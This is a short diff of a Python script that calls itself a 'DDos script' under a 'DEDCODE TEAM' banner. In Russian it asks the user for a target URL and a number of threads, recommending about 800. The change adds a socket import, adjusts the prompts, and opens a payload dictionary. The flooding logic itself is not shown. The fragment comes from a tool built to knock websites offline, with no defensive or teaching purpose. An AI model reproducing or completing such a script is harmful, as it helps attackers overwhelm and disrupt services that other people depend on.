@@ -22,6 +22,7 @@ print(green + f"З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
 
+import socket
 import requests 
 from threading import Thread
 import random
@@ -49,8 +50,8 @@ os.system("clear")
 print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 print("DDos script")
 
-url = input("Ссылка════>: ")
-threads = int(input("Потоки (~800 лучше)════>: "))
+url = input("Ссылка════> ")
+threads = int(input("Потоки (~800 лучше)════> "))
 
 payload = {
     'namest': 'username',
